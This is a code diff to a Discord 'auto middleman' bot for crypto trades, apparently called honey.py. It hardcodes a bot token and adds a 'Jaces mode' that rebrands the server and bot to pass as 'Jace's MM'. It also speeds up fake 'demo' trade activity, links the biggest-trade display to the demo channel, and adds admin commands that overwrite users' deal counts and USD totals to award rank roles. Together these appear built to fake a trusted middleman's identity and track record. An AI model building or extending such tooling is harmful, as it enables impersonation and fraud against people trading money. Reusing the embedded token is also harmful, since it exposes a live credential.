@@ -19,15 +19,15 @@ from discord.ext import commands
 from colorama import Fore, Style, init as colorama_init
 
 
-TOKEN = "MTU0MzY0MTI3ODQ5ODIxODE2NA.G6WRHu.Vp9ZvOW4ZNSe0RsFBqJ99f5Pw5_OnBZAqt3N3M" # Get from Discord Developer Portal
+TOKEN = "MTU0MzY0MTI3ODQ5ODIxODE2NA.G0dKNK.UOec5xB2OTtHMKJk4RWQDxNVAEwj6vU2Blon6M" # Get from Discord Developer Portal
 YOUR_USER = 1506688372045910227 # Your User ID
 TOS_CHANNEL = 1543637559463256214 # Middleman ToS Channel ID
-MM_TOS_CHANNEL = 1543637611070095421 # Auto Middleman ToS Channel ID
-AUTOMM_TRADE_CHANNEL = 1480211838317629541 # Channel linked in !autommtos ("start a trade here")
+MM_TOS_CHANNEL = 1543637636487450724 # Auto Middleman ToS Channel ID
+AUTOMM_TRADE_CHANNEL = 1543637629243891764 # Channel linked in !autommtos ("start a trade here") 
 TICKET_CATEGORY = 1543637510264061992 # Auto Middleman Tickets Category ID
-TRANSCRIPT_CHANNEL = 1543639036017508372 # Auto Middleman Tickets Logging Channel ID
-COMPLETED_TRANSACTION_CHANNEL = 1543639026605625354 # Completed Auto Middleman Embeds Channel ID
-SETTLEMENT_CHANNEL = 1543639018879713372
+TRANSCRIPT_CHANNEL = 1543639039868149910 # Auto Middleman Tickets Logging Channel ID
+COMPLETED_TRANSACTION_CHANNEL = 1543637629243891764 # Completed Auto Middleman Embeds Channel ID
+SETTLEMENT_CHANNEL = 1543639039868149910
 DEMO_COMPLETED_TRANSACTION_CHANNEL = 1543637640459325551 # Must be different from COMPLETED_TRANSACTION_CHANNEL
 TUTORIAL_URL = "https://www.youtube.com/watch?v=XIkpcT2WNPI" # For Tutorial Button in Panel
 
@@ -55,38 +55,51 @@ UNPAID_TIMEOUT_SECONDS = 1200
 MONITOR_INTERVAL_SECONDS = 15
 
 DEMO_ACTIVITY_ENABLED = True
-DEMO_BASE_INTERVAL_SECONDS = 420
-DEMO_JITTER_MIN_SECONDS = 60
-DEMO_JITTER_MAX_SECONDS = 180
+DEMO_BASE_INTERVAL_SECONDS = 61
+DEMO_JITTER_MIN_SECONDS = 35
+DEMO_JITTER_MAX_SECONDS = 90
 DEMO_MIN_CONFIRMATIONS = 6
 DEMO_RECENT_BLOCK_WINDOW = 500
 
 STARTING_TICKET_NUMBER = 12077
 
-BIGGEST_TRADE_USD = 29996 # Biggest completed trade amount shown on the panel footer
+BIGGEST_TRADE_USD = 30006 # Biggest completed trade amount shown on the panel footer
 BIGGEST_TRADE_MESSAGE_URL = "" # Message link to the biggest completed trade (e.g. https://discord.com/channels/guild/channel/message)
 
 # ===== Jaces mode =====
 # Put image files next to this script or inside jaces_assets/. Leave "" to skip that field.
 # Example: JACES_SERVER_ICON = "jaces_server_icon.png"
 
-JACES_SERVER_NAME = ""
-JACES_SERVER_DESCRIPTION = ""
-JACES_SERVER_ICON = ""
-JACES_SERVER_BANNER = ""
-JACES_BOT_NAME = ""
-JACES_BOT_AVATAR = ""
-JACES_BOT_BANNER = ""
-JACES_BOT_ROLE_NAME = ""
+JACES_SERVER_NAME = "Jace's MM"
+JACES_SERVER_DESCRIPTION = "https://jaces.xyz/"
+JACES_SERVER_ICON = "https://github.com/APEXkiller1234/Vaultix/blob/main/1788102354-icon%20(1).gif?raw=true"
+JACES_SERVER_BANNER = "https://github.com/APEXkiller1234/Vaultix/blob/main/jacebanner.webp?raw=true"
+JACES_BOT_NAME = "Auto Middleman"
+JACES_BOT_AVATAR = "https://github.com/APEXkiller1234/Vaultix/blob/main/image_2026-08-30_225952052.png?raw=true"
+JACES_BOT_BANNER = "https://github.com/APEXkiller1234/Vaultix/blob/main/image_2026-08-30_230056191.png?raw=true"
+JACES_BOT_ROLE_NAME = "Auto Middleman"
 
-NORMAL_SERVER_NAME = ""
-NORMAL_SERVER_DESCRIPTION = ""
-NORMAL_SERVER_ICON = ""
-NORMAL_SERVER_BANNER = ""
-NORMAL_BOT_NAME = ""
-NORMAL_BOT_AVATAR = ""
-NORMAL_BOT_BANNER = ""
-NORMAL_BOT_ROLE_NAME = ""
+NORMAL_SERVER_NAME = "Horizon Shop"
+NORMAL_SERVER_DESCRIPTION = "Best shop in the world and cheapest"
+NORMAL_SERVER_ICON = "https://github.com/APEXkiller1234/Vaultix/blob/main/image_2026-08-31_140013803.png?raw=true"
+NORMAL_SERVER_BANNER = "https://github.com/APEXkiller1234/Vaultix/blob/main/image_2026-08-31_140022263.png?raw=true"
+NORMAL_BOT_NAME = "Horizon Helper"
+NORMAL_BOT_AVATAR = "https://github.com/APEXkiller1234/Vaultix/blob/main/image_2026-08-31_140013803.png?raw=true"
+NORMAL_BOT_BANNER = "https://github.com/APEXkiller1234/Vaultix/blob/main/image_2026-08-31_140022263.png?raw=true"
+NORMAL_BOT_ROLE_NAME = "Horizon the best"
+
+# Applied by /jaces and /nonjaces. Leave "" to skip that field.
+# Status: online, idle, dnd, invisible
+# Activity type: playing, watching, listening, competing, custom
+JACES_BOT_STATUS = "online"
+JACES_BOT_ACTIVITY_TYPE = "playing"
+JACES_BOT_ACTIVITY = ""
+JACES_BOT_BIO = ""
+
+NORMAL_BOT_STATUS = "online"
+NORMAL_BOT_ACTIVITY_TYPE = "playing"
+NORMAL_BOT_ACTIVITY = ""
+NORMAL_BOT_BIO = ""
 
 
 # ===== Emojis ========
@@ -152,6 +165,7 @@ ASCII_WATERMARK = r"""
                            |___/ 
                 honey.py
 """
+
 
 
 class ColorConsoleFormatter(logging.Formatter):
@@ -291,7 +305,8 @@ def default_data():
         "jaces": {
             "guilds": {}
         },
-        "presence": default_presence()
+        "presence": default_presence(),
+        "rank_roles": []
     }
 
 
@@ -347,6 +362,11 @@ def load_data():
         data.setdefault(
             "presence",
             default_presence()
+        )
+
+        data.setdefault(
+            "rank_roles",
+            []
         )
 
         return data
@@ -563,6 +583,246 @@ def money(value):
     )
 
     return f"${amount:,.2f}"
+
+
+def money_compact(value):
+    amount = Decimal(
+        str(value or "0")
+    ).quantize(
+        Decimal("0.01")
+    )
+
+    if amount == amount.to_integral_value():
+        return f"${amount:,.0f}"
+
+    return f"${amount:,.2f}"
+
+
+def parse_money_amount(value, allow_zero=True):
+    raw = (
+        str(value)
+        .replace("$", "")
+        .replace(",", "")
+        .strip()
+    )
+
+    try:
+        amount = Decimal(raw)
+    except InvalidOperation:
+        return None
+
+    if not amount.is_finite() or amount < 0:
+        return None
+
+    if amount == 0 and not allow_zero:
+        return None
+
+    return amount.quantize(Decimal("0.01"))
+
+
+def parse_non_negative_int(value):
+    raw = (
+        str(value)
+        .replace(",", "")
+        .strip()
+    )
+
+    try:
+        number = int(raw)
+    except (TypeError, ValueError):
+        return None
+
+    if number < 0:
+        return None
+
+    return number
+
+
+def default_user_stats():
+    return {
+        "deals_completed": 0,
+        "total_usd_value": "0.00",
+        "biggest_deal": "0.00"
+    }
+
+
+def get_user_stats(user_id):
+    stats = DATA.setdefault("stats", {}).get(str(user_id))
+
+    if not isinstance(stats, dict):
+        stats = default_user_stats()
+        DATA["stats"][str(user_id)] = stats
+        return stats
+
+    stats.setdefault("deals_completed", 0)
+    stats.setdefault("total_usd_value", "0.00")
+    stats.setdefault("biggest_deal", "0.00")
+    return stats
+
+
+def rank_roles():
+    items = DATA.setdefault("rank_roles", [])
+    cleaned = []
+    seen = set()
+
+    if not isinstance(items, list):
+        items = []
+
+    for item in items:
+        if not isinstance(item, dict):
+            continue
+
+        try:
+            role_id = int(item.get("role_id"))
+            amount = Decimal(
+                str(
+                    item.get("amount")
+                    or item.get("threshold")
+                    or "0"
+                )
+            )
+        except (TypeError, ValueError, InvalidOperation):
+            continue
+
+        if role_id <= 0 or not amount.is_finite() or amount < 0:
+            continue
+
+        if role_id in seen:
+            cleaned = [
+                entry for entry in cleaned
+                if int(entry["role_id"]) != role_id
+            ]
+        else:
+            seen.add(role_id)
+
+        cleaned.append({
+            "role_id": str(role_id),
+            "amount": str(amount.quantize(Decimal("0.01")))
+        })
+
+    cleaned.sort(key=lambda entry: Decimal(entry["amount"]))
+    DATA["rank_roles"] = cleaned
+    return cleaned
+
+
+def rank_progress(total):
+    total = Decimal(str(total or "0"))
+    current = None
+    nxt = None
+
+    for item in rank_roles():
+        amount = Decimal(item["amount"])
+        if total >= amount:
+            current = item
+        elif nxt is None:
+            nxt = item
+            break
+
+    return current, nxt
+
+
+def rank_line(label, item):
+    if item is None:
+        return f"**{label}:** None"
+
+    return (
+        f"**{label}:** <@&{item['role_id']}> "
+        f"({money_compact(item['amount'])})"
+    )
+
+
+def stats_embed(user):
+    data = get_user_stats(user.id)
+    current, nxt = rank_progress(data.get("total_usd_value", "0"))
+
+    embed = discord.Embed(
+        title=user.name,
+        description=(
+            f"{rank_line('Current Rank', current)}\n"
+            f"{rank_line('Next Rank', nxt)}"
+        ),
+        colour=COLOR_NEUTRAL
+    )
+
+    embed.set_thumbnail(url=user.display_avatar.url)
+
+    embed.add_field(
+        name="Deals Completed",
+        value=str(int(data.get("deals_completed", 0))),
+        inline=False
+    )
+    embed.add_field(
+        name="Total USD Value",
+        value=money(data.get("total_usd_value", "0")),
+        inline=True
+    )
+    embed.add_field(
+        name="Biggest Deal",
+        value=money(data.get("biggest_deal", "0")),
+        inline=True
+    )
+
+    return embed
+
+
+async def sync_rank_roles(guild, user_id):
+    if guild is None or user_id is None:
+        return []
+
+    try:
+        member_id = int(user_id)
+    except (TypeError, ValueError):
+        return []
+
+    member = guild.get_member(member_id)
+    if member is None:
+        try:
+            member = await guild.fetch_member(member_id)
+        except discord.HTTPException:
+            return []
+
+    stats = get_user_stats(member_id)
+    total = Decimal(str(stats.get("total_usd_value", "0") or "0"))
+    configured = rank_roles()
+    earned_ids = {
+        int(item["role_id"])
+        for item in configured
+        if total >= Decimal(item["amount"])
+    }
+    configured_ids = {int(item["role_id"]) for item in configured}
+    me = guild.me
+    notes = []
+
+    for role_id in configured_ids:
+        role = guild.get_role(role_id)
+        if role is None or role.is_default() or role.managed:
+            continue
+
+        if me is not None and role >= me.top_role:
+            notes.append(f"{role.name} is above the bot")
+            continue
+
+        should_have = role_id in earned_ids
+        has_role = role in member.roles
+
+        try:
+            if should_have and not has_role:
+                await member.add_roles(role, reason="Reached rank")
+                notes.append(f"gave {role.name}")
+            elif has_role and not should_have:
+                await member.remove_roles(role, reason="Below rank")
+                notes.append(f"removed {role.name}")
+        except discord.HTTPException as error:
+            notes.append(f"{role.name} failed: {error}")
+
+    return notes
+
+
+async def sync_all_rank_roles(guild):
+    notes = []
+    for user_id in list(DATA.get("stats", {})):
+        notes.extend(await sync_rank_roles(guild, user_id))
+    return notes
 
 
 def crypto_amount_text(
@@ -4826,6 +5086,8 @@ async def finalize_withdrawal(
         ]
     )
 
+    recorded_users = []
+
     async with get_ticket_lock(
         channel_id
     ):
@@ -4866,9 +5128,23 @@ async def finalize_withdrawal(
             time.time()
         )
 
+        recorded_users = []
+
         if not current.get(
             "stats_recorded"
         ):
+            deal_usd = Decimal(
+                str(
+                    current[
+                        "usd_amount"
+                    ]
+                )
+            ).quantize(
+                Decimal(
+                    "0.01"
+                )
+            )
+
             for user_id in {
                 str(
                     current[
@@ -4881,14 +5157,8 @@ async def finalize_withdrawal(
                     ]
                 )
             }:
-                stats = DATA[
-                    "stats"
-                ].setdefault(
-                    user_id,
-                    {
-                        "deals_completed": 0,
-                        "total_usd_value": "0.00"
-                    }
+                stats = get_user_stats(
+                    user_id
                 )
 
                 stats[
@@ -4912,13 +5182,7 @@ async def finalize_withdrawal(
                             )
                         )
                     )
-                    + Decimal(
-                        str(
-                            current[
-                                "usd_amount"
-                            ]
-                        )
-                    )
+                    + deal_usd
                 )
 
                 stats[
@@ -4929,6 +5193,27 @@ async def finalize_withdrawal(
                             "0.01"
                         )
                     )
+                )
+
+                biggest = Decimal(
+                    str(
+                        stats.get(
+                            "biggest_deal",
+                            "0"
+                        )
+                        or "0"
+                    )
+                )
+
+                if deal_usd > biggest:
+                    stats[
+                        "biggest_deal"
+                    ] = str(
+                        deal_usd
+                    )
+
+                recorded_users.append(
+                    user_id
                 )
 
             current[
@@ -4962,6 +5247,20 @@ async def finalize_withdrawal(
     await send_completion_outputs(
         ticket
     )
+
+    guild = bot.get_guild(
+        int(
+            ticket[
+                "guild_id"
+            ]
+        )
+    )
+
+    for user_id in recorded_users:
+        await sync_rank_roles(
+            guild,
+            user_id
+        )
 
 
 async def build_transcript(channel):
@@ -5979,7 +6278,7 @@ class MiddlemanPanel(
                 "> • **Paid Service**\n"
                 
                 "> • Read our ToS before using the bot: "
-                f"{get_channel_mention(TOS_CHANNEL)}"
+                f"{get_channel_mention(MM_TOS_CHANNEL)}"
             ),
             accessory=tutorial_button
         )
@@ -6059,7 +6358,7 @@ class MiddlemanPanel(
         self.add_item(
             discord.ui.TextDisplay(
                 f"{biggest_trade_label}: "
-                f"{get_channel_mention(COMPLETED_TRANSACTION_CHANNEL)} "
+                f"{get_channel_mention(DEMO_COMPLETED_TRANSACTION_CHANNEL)} "
                 f"💬 `${BIGGEST_TRADE_USD:,.0f}`"
             )
         )
@@ -8679,6 +8978,68 @@ async def apply_bot_presence():
     )
 
 
+async def apply_bot_bio(text):
+    bio = str(text or "").strip()
+    if not bio:
+        return None
+
+    try:
+        app = bot.application
+        if app is None:
+            app = await bot.application_info()
+    except discord.HTTPException as error:
+        return f"bot bio failed: {error}"
+
+    if str(app.description or "") == bio:
+        return "bot bio skipped"
+
+    try:
+        await app.edit(description=bio[:400])
+    except (TypeError, discord.HTTPException) as error:
+        return f"bot bio failed: {error}"
+
+    return "bot bio updated"
+
+
+async def apply_profile_presence(profile):
+    notes = []
+    status = str(profile.get("bot_status") or "").strip().lower()
+    activity_type = str(
+        profile.get("bot_activity_type") or "playing"
+    ).strip().lower()
+    activity_text = str(profile.get("bot_activity") or "").strip()[:128]
+    bio = str(profile.get("bot_bio") or "").strip()
+
+    changed = False
+    state = presence_state()
+
+    if status in PRESENCE_STATUSES:
+        state["status"] = status
+        changed = True
+
+    if activity_text:
+        if activity_type not in PRESENCE_ACTIVITY_TYPES:
+            activity_type = "playing"
+        state["type"] = activity_type
+        state["text"] = activity_text
+        changed = True
+
+    if changed:
+        await save_data()
+        try:
+            await apply_bot_presence()
+            notes.append("bot activity updated")
+        except discord.HTTPException as error:
+            notes.append(f"bot activity failed: {error}")
+
+    if bio:
+        note = await apply_bot_bio(bio)
+        if note:
+            notes.append(note)
+
+    return notes
+
+
 def mark_channel_list(state, list_key, other_key, channel_id):
     current = unique_snowflakes(state.get(list_key, []), [channel_id])
     other = [
@@ -8749,7 +9110,11 @@ def config_branding(prefix):
         "bot_name": globals()[f"{prefix}_BOT_NAME"],
         "bot_avatar": globals()[f"{prefix}_BOT_AVATAR"],
         "bot_banner": globals()[f"{prefix}_BOT_BANNER"],
-        "bot_role_name": globals()[f"{prefix}_BOT_ROLE_NAME"]
+        "bot_role_name": globals()[f"{prefix}_BOT_ROLE_NAME"],
+        "bot_status": globals()[f"{prefix}_BOT_STATUS"],
+        "bot_activity_type": globals()[f"{prefix}_BOT_ACTIVITY_TYPE"],
+        "bot_activity": globals()[f"{prefix}_BOT_ACTIVITY"],
+        "bot_bio": globals()[f"{prefix}_BOT_BIO"]
     }
 
 
@@ -8767,7 +9132,11 @@ def branding_has_values(profile):
             "bot_name",
             "bot_avatar",
             "bot_banner",
-            "bot_role_name"
+            "bot_role_name",
+            "bot_status",
+            "bot_activity_type",
+            "bot_activity",
+            "bot_bio"
         )
     )
 
@@ -8946,6 +9315,7 @@ async def apply_branding_profile(guild, profile, reason):
     notes = []
 
     if not branding_has_values(profile):
+        notes.extend(await apply_profile_presence(profile))
         return notes
 
     server_name = str(profile.get("server_name") or "").strip()
@@ -9026,6 +9396,8 @@ async def apply_branding_profile(guild, profile, reason):
                     lambda: role.edit(name=role_name, reason=reason)
                 )
             )
+
+    notes.extend(await apply_profile_presence(profile))
 
     return notes
 
@@ -9627,8 +9999,10 @@ async def panel(
 )
 async def stats(
     interaction: discord.Interaction,
-    user: discord.Member
+    user: discord.Member = None
 ):
+    target = user or interaction.user
+
     log_action(
         "stats_viewed",
         requester=(
@@ -9636,41 +10010,13 @@ async def stats(
             f"({interaction.user.id})"
         ),
         target=(
-            f"{user}"
-            f"({user.id})"
+            f"{target}"
+            f"({target.id})"
         )
     )
 
-    data = DATA[
-        "stats"
-    ].get(
-        str(
-            user.id
-        ),
-        {
-            "deals_completed": 0,
-            "total_usd_value": "0.00"
-        }
-    )
-
-    embed = discord.Embed(
-        title=user.name,
-        description=(
-            "**Deals Completed**\n"
-            f"{int(data.get('deals_completed', 0))}"
-            "\n\n"
-            "**Total USD Value**\n"
-            f"{money(data.get('total_usd_value', '0'))}"
-        ),
-        colour=COLOR_NEUTRAL
-    )
-
-    embed.set_thumbnail(
-        url=user.display_avatar.url
-    )
-
     await interaction.response.send_message(
-        embed=embed
+        embed=stats_embed(target)
     )
 
 
@@ -10688,6 +11034,276 @@ async def autommtos_slash(
         "automm_tos_posted",
         user=f"{interaction.user}({interaction.user.id})",
         channel=f"{interaction.channel}({interaction.channel.id})"
+    )
+
+
+@bot.tree.command(
+    name="set_role",
+    description="Set a rank role and the USD total needed to reach it"
+)
+@app_commands.guild_only()
+@app_commands.default_permissions(administrator=True)
+@app_commands.checks.has_permissions(administrator=True)
+@app_commands.describe(
+    role="Role given when the user reaches this USD total",
+    amount="USD total required to reach this role"
+)
+async def set_role_slash(
+    interaction: discord.Interaction,
+    role: discord.Role,
+    amount: str
+):
+    if not is_jaces_admin_user(interaction.user):
+        await reply_missing_jaces_admin(interaction)
+        return
+
+    parsed = parse_money_amount(amount, allow_zero=True)
+    if parsed is None:
+        await interaction.response.send_message(
+            "Enter a valid USD amount.",
+            ephemeral=True
+        )
+        return
+
+    if role.is_default() or role.managed:
+        await interaction.response.send_message(
+            "That role cannot be used as a rank.",
+            ephemeral=True
+        )
+        return
+
+    roles = [
+        item for item in rank_roles()
+        if int(item["role_id"]) != role.id
+    ]
+    roles.append({
+        "role_id": str(role.id),
+        "amount": str(parsed)
+    })
+    roles.sort(key=lambda item: Decimal(item["amount"]))
+    DATA["rank_roles"] = roles
+    await save_data()
+
+    await interaction.response.defer(ephemeral=True, thinking=True)
+    notes = await sync_all_rank_roles(interaction.guild)
+
+    log_action(
+        "rank_role_set",
+        user=f"{interaction.user}({interaction.user.id})",
+        role=f"{role}({role.id})",
+        amount=money_compact(parsed)
+    )
+
+    extra = ""
+    if notes:
+        extra = "\n" + "\n".join(f"- {note}" for note in notes[:12])
+
+    await interaction.followup.send(
+        (
+            f"{emoji_text(GREEN_TICK_EMOJI)}"
+            f"{role.mention} is now reached at "
+            f"**{money_compact(parsed)}**."
+            f"{extra}"
+        ),
+        ephemeral=True
+    )
+
+
+@bot.tree.command(
+    name="set_biggest_deal",
+    description="Set a user's biggest deal amount"
+)
+@app_commands.guild_only()
+@app_commands.default_permissions(administrator=True)
+@app_commands.checks.has_permissions(administrator=True)
+@app_commands.describe(
+    user="The user to update",
+    amount="Biggest deal USD amount"
+)
+async def set_biggest_deal_slash(
+    interaction: discord.Interaction,
+    user: discord.Member,
+    amount: str
+):
+    if not is_jaces_admin_user(interaction.user):
+        await reply_missing_jaces_admin(interaction)
+        return
+
+    parsed = parse_money_amount(amount, allow_zero=True)
+    if parsed is None:
+        await interaction.response.send_message(
+            "Enter a valid USD amount.",
+            ephemeral=True
+        )
+        return
+
+    stats = get_user_stats(user.id)
+    stats["biggest_deal"] = str(parsed)
+    await save_data()
+
+    log_action(
+        "stats_biggest_deal_set",
+        admin=f"{interaction.user}({interaction.user.id})",
+        target=f"{user}({user.id})",
+        amount=money(parsed)
+    )
+
+    await interaction.response.send_message(
+        (
+            f"{emoji_text(GREEN_TICK_EMOJI)}"
+            f"Biggest deal for {user.mention} is now "
+            f"**{money(parsed)}**."
+        ),
+        ephemeral=True
+    )
+
+
+@bot.tree.command(
+    name="set_totalvalue",
+    description="Set a user's total USD value"
+)
+@app_commands.guild_only()
+@app_commands.default_permissions(administrator=True)
+@app_commands.checks.has_permissions(administrator=True)
+@app_commands.describe(
+    user="The user to update",
+    amount="Total USD value"
+)
+async def set_totalvalue_slash(
+    interaction: discord.Interaction,
+    user: discord.Member,
+    amount: str
+):
+    if not is_jaces_admin_user(interaction.user):
+        await reply_missing_jaces_admin(interaction)
+        return
+
+    parsed = parse_money_amount(amount, allow_zero=True)
+    if parsed is None:
+        await interaction.response.send_message(
+            "Enter a valid USD amount.",
+            ephemeral=True
+        )
+        return
+
+    stats = get_user_stats(user.id)
+    stats["total_usd_value"] = str(parsed)
+    await save_data()
+
+    await interaction.response.defer(ephemeral=True, thinking=True)
+    notes = await sync_rank_roles(interaction.guild, user.id)
+
+    log_action(
+        "stats_total_value_set",
+        admin=f"{interaction.user}({interaction.user.id})",
+        target=f"{user}({user.id})",
+        amount=money(parsed)
+    )
+
+    extra = ""
+    if notes:
+        extra = "\n" + "\n".join(f"- {note}" for note in notes)
+
+    await interaction.followup.send(
+        (
+            f"{emoji_text(GREEN_TICK_EMOJI)}"
+            f"Total USD value for {user.mention} is now "
+            f"**{money(parsed)}**."
+            f"{extra}"
+        ),
+        ephemeral=True
+    )
+
+
+@bot.tree.command(
+    name="set_totaldeals",
+    description="Set a user's completed deal count"
+)
+@app_commands.guild_only()
+@app_commands.default_permissions(administrator=True)
+@app_commands.checks.has_permissions(administrator=True)
+@app_commands.describe(
+    user="The user to update",
+    amount="Number of completed deals"
+)
+async def set_totaldeals_slash(
+    interaction: discord.Interaction,
+    user: discord.Member,
+    amount: str
+):
+    if not is_jaces_admin_user(interaction.user):
+        await reply_missing_jaces_admin(interaction)
+        return
+
+    parsed = parse_non_negative_int(amount)
+    if parsed is None:
+        await interaction.response.send_message(
+            "Enter a valid deal count.",
+            ephemeral=True
+        )
+        return
+
+    stats = get_user_stats(user.id)
+    stats["deals_completed"] = parsed
+    await save_data()
+
+    log_action(
+        "stats_total_deals_set",
+        admin=f"{interaction.user}({interaction.user.id})",
+        target=f"{user}({user.id})",
+        amount=parsed
+    )
+
+    await interaction.response.send_message(
+        (
+            f"{emoji_text(GREEN_TICK_EMOJI)}"
+            f"Deals completed for {user.mention} is now "
+            f"**{parsed}**."
+        ),
+        ephemeral=True
+    )
+
+
+@bot.tree.command(
+    name="show_roles",
+    description="Show rank roles and the USD total needed to reach them"
+)
+@app_commands.guild_only()
+@app_commands.default_permissions(administrator=True)
+@app_commands.checks.has_permissions(administrator=True)
+async def show_roles_slash(
+    interaction: discord.Interaction
+):
+    if not is_jaces_admin_user(interaction.user):
+        await reply_missing_jaces_admin(interaction)
+        return
+
+    roles = rank_roles()
+    if not roles:
+        await interaction.response.send_message(
+            "No rank roles have been set.",
+            ephemeral=True
+        )
+        return
+
+    lines = []
+    for item in roles:
+        role_id = int(item["role_id"])
+        role = interaction.guild.get_role(role_id)
+        mention = role.mention if role is not None else f"`{role_id}`"
+        lines.append(
+            f"{mention} — **{money_compact(item['amount'])}**"
+        )
+
+    embed = discord.Embed(
+        title="Rank roles",
+        description="\n".join(lines),
+        colour=COLOR_NEUTRAL
+    )
+
+    await interaction.response.send_message(
+        embed=embed,
+        ephemeral=True
     )
 
 
